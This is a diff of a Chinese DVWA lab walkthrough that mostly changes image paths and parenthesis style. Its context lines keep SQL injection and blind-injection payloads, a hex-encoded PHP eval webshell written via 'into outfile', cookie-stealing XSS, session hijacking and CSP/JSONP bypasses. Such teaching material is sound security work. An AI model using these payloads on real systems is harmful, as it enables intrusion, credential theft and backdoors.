@@ -1771,7 +1771,7 @@ if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
 
 **可以通过抓包，更改step参数，增加passed_captcha参数，绕过验证码。**
 
-![image](../../../img/渗透/实验/dvwa39.png)
+![image](../../../img/渗透/实验/dvwa/dvwa39.png)
 
 **CSRF**
 
@@ -1863,7 +1863,7 @@ generateSessionToken();
 
 ?>
 ```
-可以看到，服务器的验证逻辑是当 $resp（这里是指谷歌返回的验证结果）是 false，并且参数 recaptcha_response_field 不等于 hidd3n_valu3（或者 http 包头的 User-Agent 参数不等于 reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。
+可以看到，服务器的验证逻辑是当 $resp(这里是指谷歌返回的验证结果)是 false，并且参数 recaptcha_response_field 不等于 hidd3n_valu3(或者 http 包头的 User-Agent 参数不等于 reCAPTCHA)时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。
 
 **漏洞利用**
 
@@ -1871,11 +1871,11 @@ generateSessionToken();
 
 第一步依旧是抓包
 
-![image](../../../img/渗透/实验/dvwa40.png)
+![image](../../../img/渗透/实验/dvwa/dvwa40.png)
 
 更改参数 recaptcha_response_field 以及 http 包头的 User-Agent
 
-![image](../../../img/渗透/实验/dvwa41.png)
+![image](../../../img/渗透/实验/dvwa/dvwa41.png)
 
 注:在最新版的 dvwa 中这里要改成 `g-recaptcha-response=hidd3n_valu3`
 
@@ -1961,25 +1961,25 @@ SQL Injection，即 SQL 注入，是指攻击者通过注入恶意的SQL命令�
 
 按SQLMap中的分类来看，SQL注入类型有以下5种：
 ```
-UNION query SQL injection（可联合查询注入）
-Stacked queries SQL injection（可多语句查询注入）
-Boolean-based blind SQL injection（布尔型注入）
-Error-based SQL injection（报错型注入）
-Time-based blind SQL injection（基于时间延迟注入）
+UNION query SQL injection(可联合查询注入)
+Stacked queries SQL injection(可多语句查询注入)
+Boolean-based blind SQL injection(布尔型注入)
+Error-based SQL injection(报错型注入)
+Time-based blind SQL injection(基于时间延迟注入)
 ```
 
 **SQL 注入常规利用思路**
 ```
 1. 寻找注入点，可以通过 web 扫描工具实现
 2. 通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。
-3. 猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）
+3. 猜解关键数据库表及其重要字段与内容(常见如存放管理员账户的表名、字段名等信息)
 4. 可以通过获得的用户信息，寻找后台登录。
 5. 利用后台或了解的进一步信息，上传 webshell 或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。
 ```
 
 **手工注入思路**
 
-自动化的注入神器 sqlmap 固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。
+自动化的注入神器 sqlmap 固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入(非盲注)的步骤。
 ```
 1.判断是否存在注入，注入是字符型还是数字型
 2.猜解SQL查询语句中的字段数
@@ -2025,15 +2025,15 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     输入 `1`，查询成功：
 
-    ![image](../../../img/渗透/实验/dvwa42.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa42.png)
 
     输入 `1'and '1' ='2`，查询失败，返回结果为空：
 
-    ![image](../../../img/渗透/实验/dvwa43.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa43.png)
 
     输入 `1'or '1'='1`，查询成功：
 
-    ![image](../../../img/渗透/实验/dvwa44.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa44.png)
 
     返回了多个结果，说明存在字符型注入。
 
@@ -2043,21 +2043,21 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     输入 `1' or 1=1 order by 1 #`，查询成功：
 
-    ![image](../../../img/渗透/实验/dvwa45.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa45.png)
 
     输入 `1' or 1=1 order by 2 #`，查询成功
     输入 `1' or 1=1 order by 3 #`，查询失败：
 
-    ![image](../../../img/渗透/实验/dvwa46.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa46.png)
 
     说明执行的 SQL 查询语句中只有两个字段，即这里的 First name、Surname。
-    （这里也可以通过输入 union select 1,2,3… 来猜解字段数）
+    (这里也可以通过输入 union select 1,2,3… 来猜解字段数)
 
 3. 确定显示的字段顺序
 
     输入 `1' union select 1,2 #`，查询成功：
 
-    ![image](../../../img/渗透/实验/dvwa47.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa47.png)
 
     说明执行的 SQL 语句为 select First name,Surname from 表 where ID=’id’…
 
@@ -2067,7 +2067,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 	利用另一种方式 `1' union select user(),database() #`
 
-    ![image](../../../img/渗透/实验/dvwa48.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa48.png)
 
     说明当前的数据库为 dvwa。
 	union 查询结合了两个 select 查询结果，根据上面的 order by 语句我们知道查询包含两列，为了能够现实两列查询结果，我们需要用 union 查询结合我们构造的另外一个 select.注意在使用 union 查询的时候需要和主查询的列数相同。
@@ -2076,7 +2076,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     输入 `1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`，查询成功：
 
-    ![image](../../../img/渗透/实验/dvwa49.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa49.png)
 
     说明数据库 dvwa 中一共有两个表，guestbook 与 users。
 
@@ -2084,7 +2084,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     输入 `1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`，查询成功：
 
-    ![image](../../../img/渗透/实验/dvwa50.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa50.png)
 
     说明 users 表中有8个字段，分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login。
 
@@ -2096,7 +2096,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 	或 `1' union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users #`
 
-    ![image](../../../img/渗透/实验/dvwa51.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa51.png)
 
     这样就得到了 users 表中所有用户的 user_id,first_name,last_name,password 的数据。
 
@@ -2106,7 +2106,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 	得到 root 用户信息：
 
-	![image](../../../img/渗透/实验/dvwa76.png)
+	![image](../../../img/渗透/实验/dvwa/dvwa76.png)
 
 9. 读文件和写入拿 webshell
 
@@ -2122,7 +2122,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 	通过命令查看 secure-file-priv 的当前值 `show global variables like '%secure%';`
 
-	![image](../../../img/渗透/实验/dvwa77.png)
+	![image](../../../img/渗透/实验/dvwa/dvwa77.png)
 
 	由于我使用的是 PHPStudy 搭建的环境，MySQL 没有设置过 secure_file_priv 时，默认为 NULL
 
@@ -2138,13 +2138,13 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 		`1' union select 1,load_file('C:\\phpStudy\\PHPTutorial\\WWW\\dvwa\\index.php')#`
 
-		![image](../../../img/渗透/实验/dvwa78.png)
+		![image](../../../img/渗透/实验/dvwa/dvwa78.png)
 
 	- **利用 `into outfile()` 函数写入一句话拿 webshell**
 
 		不知道路径的情况下，先通过报错得出网站的绝对路径：`1' union select 'xx',2 into outfile 'xx'#`
 
-		![image](../../../img/渗透/实验/dvwa79.png)
+		![image](../../../img/渗透/实验/dvwa/dvwa79.png)
 
 		得到路径`C:\phpStudy\PHPTutorial\WWW\dvwa\vulnerabilities\sqli\source\low.php `
 
@@ -2154,7 +2154,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 		或者采用编码方式，如十六进制编码的方式 `1' union select 1,0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#`
 
-		![image](../../../img/渗透/实验/dvwa80.png)
+		![image](../../../img/渗透/实验/dvwa/dvwa80.png)
 
 **sqlmap**
 
@@ -2212,7 +2212,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
     抓包更改参数 id 为 `1' or 1=1`,报错
     抓包更改参数 id 为 `1 or 1=1 #`，查询成功
 
-    ![image](../../../img/渗透/实验/dvwa52.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa52.png)
 
     说明存在数字型注入。由于是数字型注入，服务器端的 mysql_real_escape_string 函数就形同虚设了，因为数字型注入并不需要借助引号。
 
@@ -2220,7 +2220,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 
     抓包更改参数 id 为 `1 order by 2 #`，查询成功：
 
-    ![image](../../../img/渗透/实验/dvwa53.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa53.png)
 
     抓包更改参数 id 为 `1 order by 3 #`，报错,说明执行的SQL查询语句中只有两个字段，即这里的 First name、Surname。
 
@@ -2228,7 +2228,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 
     抓包更改参数 id 为 `1 union select 1,2 #`，查询成功：
 
-    ![image](../../../img/渗透/实验/dvwa54.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa54.png)
 
     说明执行的SQL语句为 `select First name,Surname from 表 where ID=id…`
 
@@ -2244,13 +2244,13 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 
     抓包更改参数 id 为 `1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #` ,查询失败
 
-    ![image](../../../img/渗透/实验/dvwa55.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa55.png)
 
     这是因为单引号被转义了，变成了 `\’`。
 
     可以利用 16 进制进行绕过，抓包更改参数 id 为 `1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #`
 
-    ![image](../../../img/渗透/实验/dvwa56.png)
+    ![image](../../../img/渗透/实验/dvwa/dvwa56.png)
 
     说明 users 表中有 8 个字段，分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login。
 
@@ -2304,7 +2304,7 @@ if( isset( $_SESSION [ 'id' ] ) ) {
 
 输入 `1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #` ，查询成功：
 
-![image](../../../img/渗透/实验/dvwa57.png)
+![image](../../../img/渗透/实验/dvwa/dvwa57.png)
 
 需要特别提到的是，High 级别的查询提交页面与查询结果显示页面不是同一个，也没有执行 302 跳转，这样做的目的是为了防止一般的 sqlmap 注入，因为 sqlmap 在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。
 
@@ -2352,7 +2352,7 @@ generateSessionToken();
 
 ## SQL Injection(Blind)
 
-SQL Injection（Blind），即 SQL 盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的 SQL 注入漏洞大多是 SQL 盲注。
+SQL Injection(Blind)，即 SQL 盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的 SQL 注入漏洞大多是 SQL 盲注。
 
 **手工盲注思路**
 
@@ -2360,7 +2360,7 @@ SQL Injection（Blind），即 SQL 盲注，与一般注入的区别在于，一
 
 盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。
 
-下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：
+下面简要介绍手工盲注的步骤(可与之前的手工注入作比较)：
 ```
 1.判断是否存在注入，注入是字符型还是数字型
 2.猜解当前数据库名
@@ -2428,19 +2428,19 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 
 		下面采用二分法猜解数据库名。
 		```
-		输入 1' and ascii(substr(database(),1,1))>97 # ，显示存在，说明数据库名的第一个字符的 ascii 值大于 97（小写字母 a 的 ascii 值）；
+		输入 1' and ascii(substr(database(),1,1))>97 # ，显示存在，说明数据库名的第一个字符的 ascii 值大于 97(小写字母 a 的 ascii 值)；
 
-		输入 1' and ascii(substr(database(),1,1))<122 # ，显示存在，说明数据库名的第一个字符的 ascii 值小于 122（小写字母 z 的 ascii 值）；
+		输入 1' and ascii(substr(database(),1,1))<122 # ，显示存在，说明数据库名的第一个字符的 ascii 值小于 122(小写字母 z 的 ascii 值)；
 
-		输入 1' and ascii(substr(database(),1,1))<109 # ，显示存在，说明数据库名的第一个字符的 ascii 值小于 109（小写字母 m 的 ascii 值）；
+		输入 1' and ascii(substr(database(),1,1))<109 # ，显示存在，说明数据库名的第一个字符的 ascii 值小于 109(小写字母 m 的 ascii 值)；
 
-		输入 1' and ascii(substr(database(),1,1))<103 # ，显示存在，说明数据库名的第一个字符的 ascii 值小于 103（小写字母 g 的 ascii 值）；
+		输入 1' and ascii(substr(database(),1,1))<103 # ，显示存在，说明数据库名的第一个字符的 ascii 值小于 103(小写字母 g 的 ascii 值)；
 
-		输入 1' and ascii(substr(database(),1,1))<100 # ，显示不存在，说明数据库名的第一个字符的 ascii 值不小于 100（小写字母 d 的 ascii 值）；
+		输入 1' and ascii(substr(database(),1,1))<100 # ，显示不存在，说明数据库名的第一个字符的 ascii 值不小于 100(小写字母 d 的 ascii 值)；
 
-		输入 1' and ascii(substr(database(),1,1))>100 # ，显示不存在，说明数据库名的第一个字符的 ascii 值不大于 100（小写字母 d 的 ascii 值），所以数据库名的第一个字符的 ascii 值为 100，即小写字母 d。
+		输入 1' and ascii(substr(database(),1,1))>100 # ，显示不存在，说明数据库名的第一个字符的 ascii 值不大于 100(小写字母 d 的 ascii 值)，所以数据库名的第一个字符的 ascii 值为 100，即小写字母 d。
 		```
-		重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。
+		重复上述步骤，就可以猜解出完整的数据库名(dvwa)了。
 
 	3. 猜解数据库中的表名
 
@@ -2477,7 +2477,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 		```
 		说明第一个表的名字的第一个字符为小写字母g。
 
-		重复上述步骤，即可猜解出两个表名（guestbook、users）。
+		重复上述步骤，即可猜解出两个表名(guestbook、users)。
 
 	4. 猜解表中的字段名
 
@@ -2626,7 +2626,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 
 	抓包改参数 id 为 `1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #` ，显示存在，说明数据中的第一个表名长度为9个字符；
 
-	抓包改参数 id 为 `1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #` ，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。
+	抓包改参数 id 为 `1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #` ，(0×7573657273为users的16进制)，显示存在，说明uers表有8个字段。
 
 - **然后是基于时间的盲注**
 
@@ -2693,7 +2693,7 @@ if( isset( $_COOKIE[ 'id' ] ) ) {
 
 抓包将 cookie 中参数 id 改为 `1' and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #` ，显示存在，说明数据中的第一个表名长度为9个字符；
 
-抓包将 cookie 中参数 id 改为 `1' and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #` ，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。
+抓包将 cookie 中参数 id 改为 `1' and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #` ，(0×7573657273 为users的16进制)，显示存在，说明uers表有8个字段。
 
 ### Impossible
 **服务器端核心代码**
@@ -2743,7 +2743,7 @@ generateSessionToken();
 
 当用户登陆完成后，在服务器端就会创建一个新的会话(Session)，会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的 Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个 Session，浏览器需要把当前用户持有的 SessionID 告知服务器。最常见的做法就是把 SessionID 加密后保存在 Cookie 中，因为 Cookie 会随着 HTTP 请求头发送，且受到浏览器同源策略的保护。
 
-SessionID 一旦在生命周期内被窃取，就等同于账户失窃。同时由于 SessionID 是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登陆过程（比如密码）。Session 劫持就是一种通过窃取用户 SessionID 后，使用该 SessionID 登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效 Session。如果 SessionID 是保存在 Cookie 中的，则这种攻击可以称为 Cookie 劫持。SessionID 还可以保存在 URL 中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。
+SessionID 一旦在生命周期内被窃取，就等同于账户失窃。同时由于 SessionID 是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登陆过程(比如密码)。Session 劫持就是一种通过窃取用户 SessionID 后，使用该 SessionID 登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效 Session。如果 SessionID 是保存在 Cookie 中的，则这种攻击可以称为 Cookie 劫持。SessionID 还可以保存在 URL 中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。
 
 因此，在生成 SessionID 时，需要保证足够的随机性，比如采用足够强的伪随机数生成算法。
 
@@ -2776,7 +2776,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 
 模拟管理员登录，在浏览器 1 里，点击 Generate，Burpsuite 抓包，发送到 Repeater，go 一次
 
-![image](../../../img/渗透/实验/dvwa58.png)
+![image](../../../img/渗透/实验/dvwa/dvwa58.png)
 
 请求头中：
 > Cookie: dvwaSession=17; security=low; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
@@ -2793,7 +2793,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 在无密码认证的情况下，成功登陆到界面：
 `http://<IP地址!!!>/vulnerabilities/weak_id/`
 
-![image](../../../img/渗透/实验/dvwa59.png)
+![image](../../../img/渗透/实验/dvwa/dvwa59.png)
 
 ### Medium
 **服务器端核心代码**
@@ -2814,7 +2814,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 
 模拟管理员登录，在浏览器 1 里，点击 Generate，burp 里发现：
 
-![image](../../../img/渗透/实验/dvwa60.png)
+![image](../../../img/渗透/实验/dvwa/dvwa60.png)
 
 请求头中：
 > Cookie: dvwaSession=19; security=medium; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
@@ -2832,7 +2832,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 在无密码认证的情况下，成功登陆到界面：
 `http://<IP地址!!!>/vulnerabilities/weak_id/`
 
-![image](../../../img/渗透/实验/dvwa61.png)
+![image](../../../img/渗透/实验/dvwa/dvwa61.png)
 
 
 ### High
@@ -2879,7 +2879,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 
 模拟管理员登录，在浏览器 1 里，点击 Generate，burp 里发现：
 
-![image](../../../img/渗透/实验/dvwa62.png)
+![image](../../../img/渗透/实验/dvwa/dvwa62.png)
 
 请求头中：
 > Cookie: dvwaSession=19; security=high; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
@@ -2896,7 +2896,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 
 `http://<IP地址!!!>/vulnerabilities/weak_id/`
 
-![image](../../../img/渗透/实验/dvwa63.png)
+![image](../../../img/渗透/实验/dvwa/dvwa63.png)
 
 ### Impossible
 **服务器端核心代码**
@@ -2951,7 +2951,7 @@ documen.write 属性
 
 `http://<IP地址!!!>/vulnerabilities/xss_d/?default=English<script>alert(/xss/);</script>`
 
-![image](../../../img/渗透/实验/dvwa64.png)
+![image](../../../img/渗透/实验/dvwa/dvwa64.png)
 
 #### Medium
 **服务器端核心代码**
@@ -3024,7 +3024,7 @@ if (array_key_exists("default", $_GET) && !is_null($_GET['default'])) {
 ---
 
 ### XSS (Reflected)
-反射型 XSS，非持久化，需要欺骗用户自己去点击带有特定参数的 XSS 代码链接才能触发引起（服务器中没有这样的页面和内容），一般容易出现在搜索页面。
+反射型 XSS，非持久化，需要欺骗用户自己去点击带有特定参数的 XSS 代码链接才能触发引起(服务器中没有这样的页面和内容)，一般容易出现在搜索页面。
 
 #### Low
 **服务器端核心代码**
@@ -3071,7 +3071,7 @@ file_put_contents('cookie.txt', $cookie);
 
 XSS 利用，得到 cookies
 
-![image](../../../img/渗透/实验/dvwa81.png)
+![image](../../../img/渗透/实验/dvwa/dvwa81.png)
 
 #### Medium
 **服务器端核心代码**
@@ -3116,7 +3116,7 @@ if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
     echo "<pre>Hello {$name}</pre>";
 }
 ```
-可以看到，High 级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中 i 表示不区分大小写）不再有效。
+可以看到，High 级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过(正则表达式中 i 表示不区分大小写)不再有效。
 
 **漏洞利用**
 
@@ -3191,7 +3191,7 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 
 name 一栏前端有字数限制，可以直接修改前端代码，也可以抓包修改
 
-![image](../../../img/渗透/实验/dvwa65.png)
+![image](../../../img/渗透/实验/dvwa/dvwa65.png)
 
 message 一栏输入 `<script>alert(/xss/)</script>` ，成功弹框
 
@@ -3228,7 +3228,7 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 
 strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 `<b>` 标签。
 
-addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。
+addslashes() 函数返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串。
 
 可以看到，由于对 message 参数使用了 htmlspecialchars 函数进行编码，因此无法再通过 message 参数注入 XSS 代码，但是对于 name 参数，只是简单过滤了 `<script>` 字符串，仍然存在存储型的XSS。
 
@@ -3345,16 +3345,16 @@ $page['body'] .= '
 ';
 ```
 
-如果不看源码的话。看检查器（F12），也可以知道一些被信任的网站。
+如果不看源码的话。看检查器(F12)，也可以知道一些被信任的网站。
 
-![image](../../../img/渗透/实验/dvwa66.png)
+![image](../../../img/渗透/实验/dvwa/dvwa66.png)
 
 当中的 pastebin 是什么网站呢？一个快速分享文本内容的网站,假如文本的内容是一段 js 代码呢？
 
 源码中提示我们的， 输入 https://pastebin.com/raw/VqHmJKjr
 其内容是 `alert(document.cookie)`
 
-![image](../../../img/渗透/实验/dvwa67.png)
+![image](../../../img/渗透/实验/dvwa/dvwa67.png)
 
 那么能如何进行攻击呢? 可以用 CSRF
 ```html
@@ -3390,7 +3390,7 @@ $page['body'] .= '
 ';
 ```
 
-![image](../../../img/渗透/实验/dvwa68.png)
+![image](../../../img/渗透/实验/dvwa/dvwa68.png)
 
 中级的问题在于使用了 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=' 这个标签，
 
@@ -3417,7 +3417,7 @@ $page['body'] .= '
 ';
 ```
 
-高级就改变了形式了，点击按钮会得到答案，而这个答案是用 JSONP 的方式获得的。（常用于跨越请求）而且 cps 也设置为只信任自己的域名了 `Content-Security-Policy: script-src 'self';`
+高级就改变了形式了，点击按钮会得到答案，而这个答案是用 JSONP 的方式获得的。(常用于跨越请求)而且 cps 也设置为只信任自己的域名了 `Content-Security-Policy: script-src 'self';`
 
 点击后发请求的逻辑在 vulnerabilities/csp/source/high.js 中
 ```js
@@ -3446,15 +3446,15 @@ if (solve_button) {
 2. 因为 script 不同于 ajax，所以可以跨域发送的
 3. 服务器就根据 callback 请求，返回 solveSum({"answer":"15"}) , 就可以调用 high.js 中的 solveSum 。
 
-![image](../../../img/渗透/实验/dvwa69.png)
+![image](../../../img/渗透/实验/dvwa/dvwa69.png)
 
 但如果有人将 callback 参数改成 `callback=alert(document.cookie)` 呢？
 返回的会是 `alert(document.cookie)//({"answer":"15"}) `。。。
 所以这是一个注入点
 
-![image](../../../img/渗透/实验/dvwa70.png)
+![image](../../../img/渗透/实验/dvwa/dvwa70.png)
 
-![image](../../../img/渗透/实验/dvwa71.png)
+![image](../../../img/渗透/实验/dvwa/dvwa71.png)
 
 ### Impossible
 **服务器端核心代码**
@@ -3491,7 +3491,7 @@ $page[ 'body' ] .= '
 提交“success”一词来获胜。不是，这打 CTF 呢？
 
 <p align="center">
-    <img src="../../../img/渗透/实验/dvwa72.png">
+    <img src="../../../img/渗透/实验/dvwa/dvwa72.png">
 </p>
 
 ### Low
@@ -3627,16 +3627,16 @@ EOF;
 
 如果你改成 “success” 提交一下会出现了这个，Invalid token。这是什么回事呢？
 
-你可以打开控制台（F12），看看情况。
+你可以打开控制台(F12)，看看情况。
 你会看到这个 token，不是后台生成的，而是前台生成的。。。而前台生成的 token，是用 `md5("ChangeMe")` 而成的，而后台期待的 md5 是 `md5("success")` 。
 
-![image](../../../img/渗透/实验/dvwa73.png)
+![image](../../../img/渗透/实验/dvwa/dvwa73.png)
 
 知道怎么回事情了？参数里有 token，然后和 `md5(str_rot13(“success”))` 进行比较，一样就给你 well done。
 
 打开浏览器的开发者工具，先界面上输入 success，然后在控制台执行函数 `generate_token()` 提交，成功。
 
-![image](../../../img/渗透/实验/dvwa74.png)
+![image](../../../img/渗透/实验/dvwa/dvwa74.png)
 
 注: 先输入 success 然后 `generate_token()`
 
@@ -3684,7 +3684,7 @@ var a=['fromCharCode','toString','replace','BeJ','\x5cw+','Lyg','SuR','(w(){\x27
 ```
 
 <p align="center">
-    <img src="../../../img/渗透/实验/dvwa75.png">
+    <img src="../../../img/渗透/实验/dvwa/dvwa75.png">
 </p>
 
 http://deobfuscatejavascript.com 中提供的功能是，把混淆后的代码转成人类能看懂一些 js 代码,其中关键的部分是这里：
@@ -3712,7 +3712,7 @@ token_part_1("ABCD", 44);
 
 这里生成 token 的步骤是
 1. 执行 token_part_1("ABCD", 44)
-2. 执行 token_part_2("XX")(原本是延迟 300ms 执行的那个）
+2. 执行 token_part_2("XX")(原本是延迟 300ms 执行的那个)
 3. 点击按钮的时候执行 token_part_3
 
 所以我们在输入框输入 success 后，再到控制台中输入 `token_part_1("ABCD", 44)` 和 `token_part_2("XX")` 这两个函数就可以了。
